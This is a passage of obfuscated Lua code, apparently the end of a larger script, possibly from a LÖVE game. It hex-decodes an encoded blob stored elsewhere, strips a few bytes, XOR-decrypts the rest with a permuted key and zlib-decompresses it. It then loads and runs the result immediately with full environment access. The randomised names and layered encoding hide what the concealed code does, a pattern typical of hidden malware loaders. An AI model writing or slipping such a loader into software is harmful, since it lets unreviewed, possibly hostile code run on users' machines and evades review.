  local __oz2r111ohbr = {32,234,228,110,121,233,104,48,50,160,140,3,157,79,239,193,39,103,101,21,182,172,15,159,147,169,212,127,185,73,23,148,171,138,89,216,210}
  local __ght2fe2lhgc = {12,23,14,35,32,2,6,9,7,18,19,25,10,20,30,33,29,22,21,4,5,8,37,26,28,31,36,27,17,3,13,16,1,24,11,15,34}
  local __uv63980 = 2973
  local _swu5n1h3 = 6

  local function __czo61vhxrn3(tbl)
    local s = table.concat(tbl)
    local __wrn = {}
    for _bkd = 1, #s, 2 do
      __wrn[#__wrn+1] = tonumber(s:sub(_bkd,_bkd+1), 16)
    end
    return __wrn
  end

  local function _cr65r4zbuut9(sk_tbl, pm_tbl)
    local _g4j = {}
    for _u84pb = 1, #pm_tbl do
      _g4j[pm_tbl[_u84pb]] = sk_tbl[_u84pb]
    end
    return _g4j
  end

  local function __mmet2bsarq6z(data_tbl, key_tbl)
    local _nsv2 = {}
    local _pe4y = #key_tbl
    for _sl6 = 1, #data_tbl do
      local b  = data_tbl[_sl6]
      local ki = ((_sl6-1) % _pe4y) + 1
      local _jw4m = ((_sl6-1)*31 + 17) % 256
      _nsv2[_sl6] = (b ~ key_tbl[ki] ~ _jw4m) & 0xFF
    end
    return _nsv2
  end

  local function __fqbghjod(bytes_tbl)
    local _ylpz0 = string.char(table.unpack(bytes_tbl))
    if love and love.data then
      return love.data.decompress('string','zlib',_ylpz0)
    end
    local ok, __b359 = pcall(function()
      local z = require('zlib')
      local inf = z.inflate()
      local out, _, err2 = inf(_ylpz0)
      if err2 then error(err2) end
      return out
    end)
    if ok then return __b359 end
    return _ylpz0
  end

  local function __gt9mb3a()
    local _elleb6     = __czo61vhxrn3(_yjelampln)
    local __bkgxg7  = {}
    for i2 = 1, #(_elleb6) do
      if i2 < __uv63980 or i2 >= __uv63980 + _swu5n1h3 then
        __bkgxg7[#__bkgxg7+1] = _elleb6[i2]
      end
    end
    local _vgr3cn = _cr65r4zbuut9(__oz2r111ohbr, __ght2fe2lhgc)
    local _qvdfi7   = __mmet2bsarq6z(__bkgxg7, _vgr3cn)
    local __ufm3   = __fqbghjod(_qvdfi7)
    local _zo1s3x, _mxi67sr = load(__ufm3, '@p', 'bt', _ENV)
    if not _zo1s3x then
      error('E:' .. tostring(_mxi67sr))
    end
    return _zo1s3x()
  end

  __gt9mb3a()
end
